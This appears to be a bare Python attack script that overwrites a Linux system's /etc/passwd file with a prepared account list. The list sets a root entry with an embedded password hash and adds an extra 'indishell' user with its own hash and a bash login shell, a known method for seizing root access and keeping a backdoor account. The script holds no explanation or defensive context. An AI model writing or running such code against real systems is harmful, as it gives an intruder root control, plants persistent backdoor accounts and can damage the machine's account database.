with open("/etc/passwd", "w") as fd:
    fd.write("root:$6$9f8W5ZX1q16devBQ$1MgZ5rxBn/E.yYlJmdv5F6FliBeomJ89.BlDSZ36ZM9ml1NhbRQCqseBjw4QBgseTn1oFkkI51s21Vul3261I1:0:0:root:/root:/bin/bash" + "\n"
"daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin"+ "\n"
"bin:x:2:2:bin:/bin:/usr/sbin/nologin"+ "\n"
"sys:x:3:3:sys:/dev:/usr/sbin/nologin"+ "\n"
"sync:x:4:65534:sync:/bin:/bin/sync"+ "\n"
"games:x:5:60:games:/usr/games:/usr/sbin/nologin"+ "\n"
"man:x:6:12:man:/var/cache/man:/usr/sbin/nologin"+ "\n"
"lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin"+ "\n"
"mail:x:8:8:mail:/var/mail:/usr/sbin/nologin"+ "\n"
"news:x:9:9:news:/var/spool/news:/usr/sbin/nologin"+ "\n"
"uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin"+ "\n"
"proxy:x:13:13:proxy:/bin:/usr/sbin/nologin"+ "\n"
"www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin"+ "\n"
"backup:x:34:34:backup:/var/backups:/usr/sbin/nologin"+ "\n"
"list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin"+ "\n"
"irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin"+ "\n"
"gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin"+ "\n"
"nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin"+ "\n"
"libuuid:x:100:101::/var/lib/libuuid:"+ "\n"
"syslog:x:101:104::/home/syslog:/bin/false"+ "\n"
"messagebus:x:102:106::/var/run/dbus:/bin/false"+ "\n"
"usbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/false"+ "\n"
"dnsmasq:x:104:65534:dnsmasq,,,:/var/lib/misc:/bin/false"+ "\n"
"avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false"+ "\n"
"kernoops:x:106:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false"+ "\n"
"rtkit:x:107:114:RealtimeKit,,,:/proc:/bin/false"+ "\n"
"saned:x:108:115::/home/saned:/bin/false"+ "\n"
"whoopsie:x:109:116::/nonexistent:/bin/false"+ "\n"
"speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh"+ "\n"
"avahi:x:111:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false"+ "\n"
"lightdm:x:112:118:Light Display Manager:/var/lib/lightdm:/bin/"+ "\n"
"colord:x:113:121:colord colour management daemon,,,:/var/lib/colord:/bin/false"+ "\n"
"hplip:x:114:7:HPLIP system user,,,:/var/run/hplip:/bin/false"+ "\n"
"pulse:x:115:122:PulseAudio daemon,,,:/var/run/pulse:/bin/false"+ "\n"
"nm-openconnect:x:116:124:NetworkManager OpenConnect plugin,,,:/var/lib/NetworkManager:/bin/false"+ "\n"
"sshd:x:117:65534::/var/run/sshd:/usr/sbin/nologin"+ "\n"
"debian-tor:x:118:125::/var/lib/tor:/bin/false"+ "\n"
"postgres:x:119:127:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash"+ "\n"
"iodine:x:120:65534::/var/run/iodine:/bin/false"+ "\n"
"thpot:x:121:65534:Honeypot user,,,:/usr/share/thpot:/dev/null"+ "\n"
"statd:x:122:65534::/var/lib/nfs:/bin/false"+ "\n"
"redis:x:123:128:redis server,,,:/var/lib/redis:/bin/false"+ "\n"
"indishell:$6$AunCdsxZ$OBxuMf0a/GqstthT4LEW8RGZxepGL7C3jHMk/IFyhLCTJ/.0fo/9Aa.s134i80zAr1HtdyICiogwDAXzG0NWZ0:1000:1000:indishell,,,:/home/indishell:/bin/bash"+ "\n"
"vboxadd:x:999:1::/var/run/vboxadd:/bin/false"+ "\n"
"mysql:x:124:129:MySQL Server,,,:/nonexistent:/bin/false"+ "\n"
"tomcat7:x:125:130::/usr/share/tomcat7:/bin/false")
print(fd)
